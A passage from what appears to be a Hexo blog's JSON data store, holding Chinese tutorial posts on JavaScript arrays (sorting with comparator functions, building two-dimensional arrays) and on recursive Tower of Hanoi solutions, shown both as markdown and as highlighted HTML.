title=\"概述\"></a>概述</h1><p>数组是计算机编程世界里最常见的数据结构。任何编程语言都包含，为内建类型，效率很高。本篇主要梳理 JavaScript 中数组的相关知识点。整体结构如下，具体细节见参考书籍，常见使用场景见详述部分。<br><img src=\"/数据结构与算法@数组/0.svg\" alt=\"思维导图\"></p>\n<a id=\"more\"></a>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><p>数组在 JavaScript 中只是一种特殊的对象，所以一个数组中的元素可以是各种类型，不必像其他语言要求是同一种类型。</p>\n<h2 id=\"sort-中使用比较函数\"><a href=\"#sort-中使用比较函数\" class=\"headerlink\" title=\"sort 中使用比较函数\"></a>sort 中使用比较函数</h2><p>sort()方法是按照字典顺序对元素进行排序的，因此它假定元素都是字符串类型。实际场景中通常需要排序数字类型、对象类型等，这样就需要传入一个比较函数来实现我们的目标。</p>\n<h3 id=\"数字类型排序\"><a href=\"#数字类型排序\" class=\"headerlink\" title=\"数字类型排序\"></a>数字类型排序</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> numbers = [<span class=\"number\">10</span>, <span class=\"number\">3</span>, <span class=\"number\">22</span>, <span class=\"number\">6</span>, <span class=\"number\">4</span>];</span><br><span class=\"line\">numbers.sort();</span><br><span class=\"line\"><span class=\"comment\">// [10, 22, 3, 4, 6]</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">compare</span>(<span class=\"params\">num1, num2</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> num1 - num2;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">numbers.sort(compare);</span><br><span class=\"line\"><span class=\"comment\">// [3, 4, 6, 10, 22]</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"对象类型排序\"><a href=\"#对象类型排序\" class=\"headerlink\" title=\"对象类型排序\"></a>对象类型排序</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> students = [</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    name: <span class=\"string\">\"baidu\"</span>,</span><br><span class=\"line\">    age: <span class=\"number\">12</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    name: <span class=\"string\">\"ali\"</span>,</span><br><span class=\"line\">    age: <span class=\"number\">22</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    name: <span class=\"string\">\"tengxun\"</span>,</span><br><span class=\"line\">    age: <span class=\"number\">8</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">compareFunc</span>(<span class=\"params\">propName</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">obj1, obj2</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> value1 = obj1[propName];</span><br><span class=\"line\">    <span class=\"keyword\">var</span> value2 = obj2[propName];</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (value1 &lt; value2) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (value1 &gt; value2) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// 按age排序</span></span><br><span class=\"line\">students.sort(compareFunc(<span class=\"string\">\"age\"</span>));</span><br><span class=\"line\"><span class=\"comment\">// 按name排序</span></span><br><span class=\"line\">students.sort(compareFunc(<span class=\"string\">\"name\"</span>));</span><br></pre></td></tr></table></figure>\n<h2 id=\"创建二维数组通用方法\"><a href=\"#创建二维数组通用方法\" class=\"headerlink\" title=\"创建二维数组通用方法\"></a>创建二维数组通用方法</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">Array</span>.matrix = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">numRows, numCols, initial</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> arr = [];</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; numRows; i++) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> columns = [];</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> j = <span class=\"number\">0</span>; j &lt; numCols; j++) &#123;</span><br><span class=\"line\">      columns[j] = initial;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    arr[i] = columns;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> arr;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<h2 id=\"练习\"><a href=\"#练习\" class=\"headerlink\" title=\"练习\"></a>练习</h2><p>更多练习及实现答案请参考下一篇<a href=\"/2019/04/28/data-structures-array-2\">数据结构——数组(练习题及实现)</a></p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p>《数据结构与算法 JavaScript 描述》<br>《学习 JavaScript 数据结构与算法（第 2 版）》</p>\n","site":{"data":{}},"excerpt":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>数组是计算机编程世界里最常见的数据结构。任何编程语言都包含，为内建类型，效率很高。本篇主要梳理 JavaScript 中数组的相关知识点。整体结构如下，具体细节见参考书籍，常见使用场景见详述部分。<br><img src=\"/数据结构与算法@数组/0.svg\" alt=\"思维导图\"></p>","more":"<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><p>数组在 JavaScript 中只是一种特殊的对象，所以一个数组中的元素可以是各种类型，不必像其他语言要求是同一种类型。</p>\n<h2 id=\"sort-中使用比较函数\"><a href=\"#sort-中使用比较函数\" class=\"headerlink\" title=\"sort 中使用比较函数\"></a>sort 中使用比较函数</h2><p>sort()方法是按照字典顺序对元素进行排序的，因此它假定元素都是字符串类型。实际场景中通常需要排序数字类型、对象类型等，这样就需要传入一个比较函数来实现我们的目标。</p>\n<h3 id=\"数字类型排序\"><a href=\"#数字类型排序\" class=\"headerlink\" title=\"数字类型排序\"></a>数字类型排序</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> numbers = [<span class=\"number\">10</span>, <span class=\"number\">3</span>, <span class=\"number\">22</span>, <span class=\"number\">6</span>, <span class=\"number\">4</span>];</span><br><span class=\"line\">numbers.sort();</span><br><span class=\"line\"><span class=\"comment\">// [10, 22, 3, 4, 6]</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">compare</span>(<span class=\"params\">num1, num2</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> num1 - num2;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">numbers.sort(compare);</span><br><span class=\"line\"><span class=\"comment\">// [3, 4, 6, 10, 22]</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"对象类型排序\"><a href=\"#对象类型排序\" class=\"headerlink\" title=\"对象类型排序\"></a>对象类型排序</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> students = [</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    name: <span class=\"string\">\"baidu\"</span>,</span><br><span class=\"line\">    age: <span class=\"number\">12</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    name: <span class=\"string\">\"ali\"</span>,</span><br><span class=\"line\">    age: <span class=\"number\">22</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    name: <span class=\"string\">\"tengxun\"</span>,</span><br><span class=\"line\">    age: <span class=\"number\">8</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">compareFunc</span>(<span class=\"params\">propName</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">obj1, obj2</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> value1 = obj1[propName];</span><br><span class=\"line\">    <span class=\"keyword\">var</span> value2 = obj2[propName];</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (value1 &lt; value2) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (value1 &gt; value2) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// 按age排序</span></span><br><span class=\"line\">students.sort(compareFunc(<span class=\"string\">\"age\"</span>));</span><br><span class=\"line\"><span class=\"comment\">// 按name排序</span></span><br><span class=\"line\">students.sort(compareFunc(<span class=\"string\">\"name\"</span>));</span><br></pre></td></tr></table></figure>\n<h2 id=\"创建二维数组通用方法\"><a href=\"#创建二维数组通用方法\" class=\"headerlink\" title=\"创建二维数组通用方法\"></a>创建二维数组通用方法</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">Array</span>.matrix = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">numRows, numCols, initial</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> arr = [];</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; numRows; i++) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> columns = [];</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> j = <span class=\"number\">0</span>; j &lt; numCols; j++) &#123;</span><br><span class=\"line\">      columns[j] = initial;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    arr[i] = columns;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> arr;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<h2 id=\"练习\"><a href=\"#练习\" class=\"headerlink\" title=\"练习\"></a>练习</h2><p>更多练习及实现答案请参考下一篇<a href=\"/2019/04/28/data-structures-array-2\">数据结构——数组(练习题及实现)</a></p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p>《数据结构与算法 JavaScript 描述》<br>《学习 JavaScript 数据结构与算法（第 2 版）》</p>"},{"title":"数据结构与算法@汉诺塔","date":"2019-05-17T08:28:51.000Z","updated":"2019-05-17T08:28:51.000Z","_content":"\n# 概述\n\n有三根相邻的柱子，标号为 A,B,C，A 柱子上从下到上按金字塔状叠放着 n 个不同大小的圆盘，要把所有盘子一个一个移动到柱子 B 上，并且每次移动同一根柱子上都不能出现大盘子在小盘子上方，请问至少需要多少次移动，设移动次数为 H(n）。\n![汉诺塔玩具模型图](overview.jpg)\n\n<!-- more -->\n\n# 详述\n\n汉诺塔：汉诺塔（又称河内塔）问题是源于印度一个古老传说的益智玩具。大梵天创造世界的时候做了三根金刚石柱子，在一根柱子上从下往上按照大小顺序摞着 64 片黄金圆盘。大梵天命令婆罗门把圆盘从下面开始按大小顺序重新摆放在另一根柱子上。并且规定，在小圆盘上不能放大圆盘，在三根柱子之间一次只能移动一个圆盘。\n\n```js\nfunction towerOfHanoi(\n  plates,\n  source,\n  helper,\n  dest,\n  sourceName,\n  helperName,\n  destName,\n  moves = []\n) {\n  if (plates <= 0) {\n    return moves;\n  }\n  if (plates === 1) {\n    dest.push(source.pop());\n    const move = {};\n    move[sourceName] = source.toString();\n    move[helperName] = helper.toString();\n    move[destName] = dest.toString();\n    moves.push(move);\n  } else {\n    towerOfHanoi(\n      plates - 1,\n      source,\n      dest,\n      helper,\n      sourceName,\n      destName,\n      helperName,\n      moves\n    );\n    dest.push(source.pop());\n    const move = {};\n    move[sourceName] = source.toString();\n    move[helperName] = helper.toString();\n    move[destName] = dest.toString();\n    moves.push(move);\n    towerOfHanoi(\n      plates - 1,\n      helper,\n      source,\n      dest,\n      helperName,\n      sourceName,\n      destName,\n      moves\n    );\n  }\n  return moves;\n}\n\nfunction hanoiStack(plates) {\n  const source = new Stack2();\n  const dest = new Stack2();\n  const helper = new Stack2();\n\n  for (let i = plates; i > 0; i--) {\n    source.push(i);\n  }\n\n  return towerOfHanoi(plates, source, helper, dest, \"source\", \"helper\", \"dest\");\n}\n\n// function hanoi0(plates, source, helper, dest, moves = []) {\n//   if (plates <= 0) {\n//     return moves;\n//   }\n//   if (plates === 1) {\n//     moves.push([source, dest]);\n//   } else {\n//     hanoi(plates - 1, source, dest, helper, moves);\n//     moves.push([source, dest]);\n//     hanoi(plates - 1, helper, source, dest, moves);\n//   }\n//   return moves;\n// }\n\nfunction hanoi(n, x, y, z, moves = []) {\n  let move = function(id, from, to) {\n    console.log(id + \"号盘从\" + from + \"移动到\" + to);\n    moves.push([from, to]);\n  };\n  if (n > 0) {\n    hanoi(n - 1, x, z, y, moves);\n    move(n, x, z);\n    hanoi(n - 1, y, x, z, moves);\n  }\n  return moves;\n}\n\nconsole.log(hanoiStack(3));\nconsole.log(hanoi(3, \"A\", \"B\", \"C\"));\n```\n\n# 参考\n","source":"_posts/2019/05/数据结构与算法-汉诺塔.md","raw":"---\ntitle: 数据结构与算法@汉诺塔\npermalink: 数据结构与算法@汉诺塔\ntags:\n  - JavaScript\ncategories:\n  - 基础\n  - 数据结构与算法\ndate: 2019-05-17 16:28:51\nupdated: 2019-05-17 16:28:51\n---\n\n# 概述\n\n有三根相邻的柱子，标号为 A,B,C，A 柱子上从下到上按金字塔状叠放着 n 个不同大小的圆盘，要把所有盘子一个一个移动到柱子 B 上，并且每次移动同一根柱子上都不能出现大盘子在小盘子上方，请问至少需要多少次移动，设移动次数为 H(n）。\n![汉诺塔玩具模型图](overview.jpg)\n\n<!-- more -->\n\n# 详述\n\n汉诺塔：汉诺塔（又称河内塔）问题是源于印度一个古老传说的益智玩具。大梵天创造世界的时候做了三根金刚石柱子，在一根柱子上从下往上按照大小顺序摞着 64 片黄金圆盘。大梵天命令婆罗门把圆盘从下面开始按大小顺序重新摆放在另一根柱子上。并且规定，在小圆盘上不能放大圆盘，在三根柱子之间一次只能移动一个圆盘。\n\n```js\nfunction towerOfHanoi(\n  plates,\n  source,\n  helper,\n  dest,\n  sourceName,\n  helperName,\n  destName,\n  moves = []\n) {\n  if (plates <= 0) {\n    return moves;\n  }\n  if (plates === 1) {\n    dest.push(source.pop());\n    const move = {};\n    move[sourceName] = source.toString();\n    move[helperName] = helper.toString();\n    move[destName] = dest.toString();\n    moves.push(move);\n  } else {\n    towerOfHanoi(\n      plates - 1,\n      source,\n      dest,\n      helper,\n      sourceName,\n      destName,\n      helperName,\n      moves\n    );\n    dest.push(source.pop());\n    const move = {};\n    move[sourceName] = source.toString();\n    move[helperName] = helper.toString();\n    move[destName] = dest.toString();\n    moves.push(move);\n    towerOfHanoi(\n      plates - 1,\n      helper,\n      source,\n      dest,\n      helperName,\n      sourceName,\n      destName,\n      moves\n    );\n  }\n  return moves;\n}\n\nfunction hanoiStack(plates) {\n  const source = new Stack2();\n  const dest = new Stack2();\n  const helper = new Stack2();\n\n  for (let i = plates; i > 0; i--) {\n    source.push(i);\n  }\n\n  return towerOfHanoi(plates, source, helper, dest, \"source\", \"helper\", \"dest\");\n}\n\n// function hanoi0(plates, source, helper, dest, moves = []) {\n//   if (plates <= 0) {\n//     return moves;\n//   }\n//   if (plates === 1) {\n//     moves.push([source, dest]);\n//   } else {\n//     hanoi(plates - 1, source, dest, helper, moves);\n//     moves.push([source, dest]);\n//     hanoi(plates - 1, helper, source, dest, moves);\n//   }\n//   return moves;\n// }\n\nfunction hanoi(n, x, y, z, moves = []) {\n  let move = function(id, from, to) {\n    console.log(id + \"号盘从\" + from + \"移动到\" + to);\n    moves.push([from, to]);\n  };\n  if (n > 0) {\n    hanoi(n - 1, x, z, y, moves);\n    move(n, x, z);\n    hanoi(n - 1, y, x, z, moves);\n  }\n  return moves;\n}\n\nconsole.log(hanoiStack(3));\nconsole.log(hanoi(3, \"A\", \"B\", \"C\"));\n```\n\n# 参考\n","slug":"数据结构与算法@汉诺塔","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d8y2007xwovvx2d3audn","content":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>有三根相邻的柱子，标号为 A,B,C，A 柱子上从下到上按金字塔状叠放着 n 个不同大小的圆盘，要把所有盘子一个一个移动到柱子 B 上，并且每次移动同一根柱子上都不能出现大盘子在小盘子上方，请问至少需要多少次移动，设移动次数为 H(n）。<br><img src=\"/数据结构与算法@汉诺塔/overview.jpg\" alt=\"汉诺塔玩具模型图\"></p>\n<a id=\"more\"></a>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><p>汉诺塔：汉诺塔（又称河内塔）问题是源于印度一个古老传说的益智玩具。大梵天创造世界的时候做了三根金刚石柱子，在一根柱子上从下往上按照大小顺序摞着 64 片黄金圆盘。大梵天命令婆罗门把圆盘从下面开始按大小顺序重新摆放在另一根柱子上。并且规定，在小圆盘上不能放大圆盘，在三根柱子之间一次只能移动一个圆盘。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">towerOfHanoi</span>(<span class=\"params\"></span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"params\">  plates,</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"params\">  source,</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"params\">  helper,</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"params\">  dest,</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"params\">  sourceName,</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"params\">  helperName,</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"params\">  destName,</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"params\">  moves = []</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (plates &lt;= <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> moves;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (plates === <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">    dest.push(source.pop());</span><br><span class=\"line\">    <span class=\"keyword\">const</span> move = &#123;&#125;;</span><br><span class=\"line\">    move[sourceName] = source.toString();</span><br><span class=\"line\">    move[helperName] = helper.toString();</span><br><span class=\"line\">    move[destName] = dest.toString();</span><br><span class=\"line\">    moves.push(move);</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    towerOfHanoi(</span><br><span class=\"line\">      plates - <span class=\"number\">1</span>,</span><br><span class=\"line\">      source,</span><br><span class=\"line\">      dest,</span><br><span class=\"line\">      helper,</span><br><span class=\"line\">      sourceName,</span><br><span class=\"line\">      destName,</span><br><span class=\"line\">      helperName,</span><br><span class=\"line\">      moves</span><br><span class=\"line\">    );</span><br><span class=\"line\">    dest.push(source.pop());</span><br><span class=\"line\">    <span class=\"keyword\">const</span> move = &#123;&#125;;</span><br><span class=\"line\">    move[sourceName] = source.toString();</span><br><span class=\"line\">    move[helperName] = helper.toString();</span><br><span class=\"line\">    move[destName] = dest.toString();</span><br><span class=\"line\">    moves.push(move);</span><br><span class=\"line\">    towerOfHanoi(</span><br><span class=\"line\">      plates - <span class=\"number\">1</span>,</span><br><span class=\"line\">      helper,</span><br><span class=\"line\">      source,</span><br><span class=\"line\">      dest,</span><br><span class=\"line\">      helperName,</span><br><span class=\"line\">      sourceName,</span><br><span class=\"line\">      destName,</span><br><span class=\"line\">      moves</span><br><span class=\"line\">    );</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> moves;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">hanoiStack</span>(<span class=\"params\">plates</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> source = <span class=\"keyword\">new</span> Stack2();</span><br><span class=\"line\">  <span class=\"keyword\">const</span> dest = <span class=\"keyword\">new</span> Stack2();</span><br><span class=\"line\">  <span class=\"keyword\">const</span> helper = <span class=\"keyword\">new</span> Stack2();</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = plates; i &gt; <span class=\"number\">0</span>; i--) &#123;</span><br><span class=\"line\">    source.push(i);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> towerOfHanoi(plates, source, helper, dest, <span class=\"string\">\"source\"</span>, <span class=\"string\">\"helper\"</span>, <span class=\"string\">\"dest\"</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// function hanoi0(plates, source, helper, dest, moves = []) &#123;</span></span><br><span class=\"line\"><span class=\"comment\">//   if (plates &lt;= 0) &#123;</span></span><br><span class=\"line\"><span class=\"comment\">//     return moves;</span></span><br><span class=\"line\"><span class=\"comment\">//   &#125;</span></span><br><span class=\"line\"><span class=\"comment\">//   if (plates === 1) &#123;</span></span><br><span class=\"line\"><span class=\"comment\">//     moves.push([source, dest]);</span></span><br><span class=\"line\"><span class=\"comment\">//   &#125; else &#123;</span></span><br><span class=\"line\"><span class=\"comment\">//     hanoi(plates - 1, source, dest, helper, moves);</span></span><br><span class=\"line\"><span class=\"comment\">//     moves.push([source, dest]);</span></span><br><span class=\"line\"><span class=\"comment\">//     hanoi(plates - 1, helper, source, dest, moves);</span></span><br><span class=\"line\"><span class=\"comment\">//   &#125;</span></span><br><span class=\"line\"><span class=\"comment\">//   return moves;</span></span><br><span class=\"line\"><span class=\"comment\">// &#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">hanoi</span>(<span class=\"params\">n, x, y, z, moves = []</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> move = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">id, from, to</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(id + <span class=\"string\">\"号盘从\"</span> + <span class=\"keyword\">from</span> + <span class=\"string\">\"移动到\"</span> + to);</span><br><span class=\"line\">    moves.push([<span class=\"keyword\">from</span>, to]);</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (n &gt; <span 